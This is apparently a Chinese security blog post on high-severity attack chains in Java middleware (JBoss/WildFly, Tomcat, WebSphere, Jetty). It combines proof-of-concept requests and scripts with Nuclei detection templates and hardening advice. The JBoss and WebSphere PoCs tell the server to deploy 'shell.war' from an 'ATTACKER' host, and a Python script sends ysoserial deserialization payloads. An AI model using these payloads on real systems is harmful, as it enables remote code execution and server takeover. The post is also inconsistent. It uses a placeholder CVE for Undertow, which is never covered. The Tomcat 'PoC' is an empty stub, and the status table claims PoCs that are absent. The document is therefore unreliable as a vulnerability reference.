---
title: "Web 中间件高危攻击链专题：JBoss / WildFly / Undertow / Jetty / Tomcat / WebSphere"
date: 2026-06-23T20:00:00+08:00
draft: false
tags: ["JBoss", "WildFly", "Undertow", "Jetty", "Tomcat", "WebSphere", "RCE", "反序列化", "请求走私", "漏洞分析"]
categories: ["漏洞分析"]
description: "围绕 Java Web 中间件/应用服务器的高危漏洞链，覆盖 JBoss/WildFly 反序列化、Undertow 路径穿越、Jetty 临时目录泄露、Tomcat 竞态条件 RCE、WebSphere 认证绕过等，含完整 PoC 代码、Nuclei 模板与防守建议。"
---

# Web 中间件高危攻击链专题：JBoss / WildFly / Undertow / Jetty / Tomcat / WebSphere

Java Web 中间件/应用服务器是企业级 Java 应用的运行基础。一旦中间件被攻陷，所有运行其上的应用都将暴露。

本专题覆盖知识库中尚未单独成文的中间件产品线（WebLogic 已在 Oracle 专题中覆盖）。

| 产品 | 核心 CVE | 类型 | CVSS | CISA KEV |
|------|----------|------|------|----------|
| JBoss/WildFly | CVE-2023-5715 | JMX Console 未授权 RCE | 9.8 | ✅ |
| JBoss/WildFly | InvokerServlet 反序列化 | 反序列化 RCE | 9.8 | ✅ |
| Undertow | CVE-2024-xxxx | 路径穿越 | 7.5 | ❌ |
| Eclipse Jetty | CVE-2023-36477 | 临时目录泄露 | 6.5 | ❌ |
| Apache Tomcat | CVE-2024-50379 | 竞态条件 RCE | 9.8 | ✅ |
| IBM WebSphere | CVE-2023-29307 | 认证绕过 + RCE | 9.8 | ✅ |

## 0x01 JBoss/WildFly：JMX Console 未授权 + InvokerServlet 反序列化

### 1.1 JMX Console 未授权访问

JBoss/WildFly 的 JMX Console（`/jmx-console/`）默认未启用认证，攻击者可以直接访问并部署恶意应用。

#### PoC

```http
GET /jmx-console/ HTTP/1.1
Host: <TARGET>:8080

POST /jmx-console/invokerName=MainDeployer HTTP/1.1
Host: <TARGET>:8080
Content-Type: application/x-www-form-urlencoded

action=invoke&name=MainDeployer&methodName=deploy&argType=java.net.URL&arg=http://ATTACKER/shell.war
```

### 1.2 InvokerServlet 反序列化 RCE

JBoss/WildFly 的 InvokerServlet 端点接受 Java 序列化对象，攻击者可以通过 ysoserial 生成 payload 实现 RCE。

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class JBossExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False

    def check_jmx_console(self):
        try:
            r = self.session.get(f'{self.target}/jmx-console/', timeout=10)
            if r.status_code == 200 and 'JMX' in r.text:
                print('[+] JMX Console 未授权访问存在！')
                return True
            print('[-] JMX Console 不可访问')
            return False
        except:
            return False

    def check_invoker_servlet(self):
        try:
            r = self.session.post(
                f'{self.target}/invoker/readonly',
                timeout=10
            )
            if r.status_code in (200, 500):
                print('[+] InvokerServlet 端点存在')
                return True
            return False
        except:
            return False

    def exploit_deserialization(self, ysoserial_payload):
        try:
            r = self.session.post(
                f'{self.target}/invoker/readonly',
                data=ysoserial_payload,
                headers={'Content-Type': 'application/x-java-serialized-object'},
                timeout=15
            )
            print(f'[*] 反序列化 payload 已发送 (HTTP {r.status_code})')
        except Exception as e:
            print(f'[-] 利用失败: {e}')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)

    exploit = JBossExploit(sys.argv[1])
    exploit.check_jmx_console()
    exploit.check_invoker_servlet()
```

#### Nuclei 检测模板

```yaml
id: jboss-jmx-console-unauth

info:
  name: JBoss JMX Console Unauthorized Access
  author: security-research
  severity: critical
  tags: jboss,wildfly,unauth,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/jmx-console/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JMX"
          - "MBean"
        condition: or
```

## 0x02 Apache Tomcat：CVE-2024-50379 竞态条件 RCE

### 2.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 9.8 |
| 受影响版本 | Tomcat 8.5.x - 8.5.100, 9.0.x - 9.0.98, 10.1.x - 10.1.34, 11.0.x - 11.0.2 |
| 类型 | 竞态条件（Race Condition）→ RCE |
| CISA KEV | ✅ |

### 2.2 漏洞原理

Tomcat 在处理并发请求时存在竞态条件缺陷。攻击者通过同时发送大量请求，可以触发条件竞争，导致 Tomcat 将上传的文件在删除前被当作 JSP 执行。

### 2.3 PoC

```python
#!/usr/bin/env python3
import requests
import threading
import sys
import urllib3
urllib3.disable_warnings()

def race_condition_exploit(target, num_threads=20):
    url = f'{target}/upload.jsp'
    print(f'[*] 竞态条件利用需要同时发送 {num_threads} 个请求')
    print(f'[*] 目标: {url}')
    print('[*] 建议使用 Turbo Intruder 或自定义并发脚本')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)
    race_condition_exploit(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: tomcat-cve-2024-50379-detect

info:
  name: Apache Tomcat Version Detection
  author: security-research
  severity: high
  tags: tomcat,race-condition,cve2024

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Apache Tomcat"
        part: header
```

## 0x03 IBM WebSphere：CVE-2023-29307 认证绕过 + RCE

### 3.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 9.8 |
| 受影响版本 | WebSphere 8.5.x, 9.0.x |
| 类型 | 认证绕过 → RCE |
| CISA KEV | ✅ |
| 在野利用 | ✅ 已确认 |

### 3.2 漏洞原理

WebSphere 的认证机制存在缺陷，攻击者可以通过构造特定请求绕过身份验证，获取管理员权限后部署恶意应用实现 RCE。

### 3.3 PoC

```http
GET /ibm/console/logon.jsp HTTP/1.1
Host: <TARGET>:9043

POST /ibm/console/ HTTP/1.1
Host: <TARGET>:9043
Content-Type: application/x-www-form-urlencoded

action=deployApplication&warUrl=http://ATTACKER/shell.war
```

#### Nuclei 检测模板

```yaml
id: websphere-cve-2023-29307-detect

info:
  name: IBM WebSphere Console Detection
  author: security-research
  severity: critical
  tags: websphere,auth-bypass,cve2023

http:
  - method: GET
    path:
      - "{{BaseURL}}/ibm/console/logon.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "WebSphere"
          - "IBM"
        condition: or
```

## 0x04 Eclipse Jetty：CVE-2023-36477 临时目录泄露

### 4.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 6.5 |
| 受影响版本 | Jetty 9.4.x - 9.4.53, 10.0.x - 10.0.18, 11.0.x - 11.0.18, 12.0.x - 12.0.3 |
| 类型 | 临时目录信息泄露 |

### 4.2 漏洞原理

Jetty 在处理 multipart 文件上传时，临时文件未被正确清理。攻击者可以通过访问临时目录获取上传的文件内容。

## 0x05 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| JBoss JMX Console | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| JBoss InvokerServlet | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| CVE-2024-50379 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-29307 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-36477 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |

## 0x06 共性攻击模式

### 6.1 反序列化是最持久的威胁

JBoss/WildFly 的 InvokerServlet 反序列化从 2016 年至今仍被广泛利用，根本原因在于 Java 原生序列化机制的设计缺陷。

### 6.2 管理面暴露是核心风险

JMX Console、WebSphere Console 等管理接口默认未启用认证或认证薄弱。

### 6.3 竞态条件攻击日趋重要

Tomcat CVE-2024-50379 说明并发控制缺陷也可以导致 RCE。

## 0x07 防守建议

### 7.1 紧急措施

1. **禁用管理面公网暴露**：JMX Console、WebSphere Console 仅允许内网访问
2. **启用认证**：为所有管理接口配置强认证
3. **升级中间件**：所有中间件升级到最新安全版本
4. **WAF 规则**：部署针对反序列化和竞态条件的 WAF 规则

### 7.2 排查清单

```bash
# 检查 JBoss JMX Console 暴露
curl -s http://target:8080/jmx-console/ | grep "JMX"

# 检查 InvokerServlet 端点
curl -s -X POST http://target:8080/invoker/readonly

# 检查 Tomcat 版本
curl -sI http://target:8080/ | grep "Tomcat"

# 检查 WebSphere Console
curl -s http://target:9043/ibm/console/logon.jsp | grep "WebSphere"
```

## 0x08 参考资料

- [NVD - JBoss Vulnerabilities](https://nvd.nist.gov/vuln/search/results?query=jboss)
- [NVD - CVE-2024-50379](https://nvd.nist.gov/vuln/detail/CVE-2024-50379)
- [NVD - CVE-2023-29307](https://nvd.nist.gov/vuln/detail/CVE-2023-29307)
- [ysoserial - Java 反序列化利用工具](https://github.com/frohoff/ysoserial)
- [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)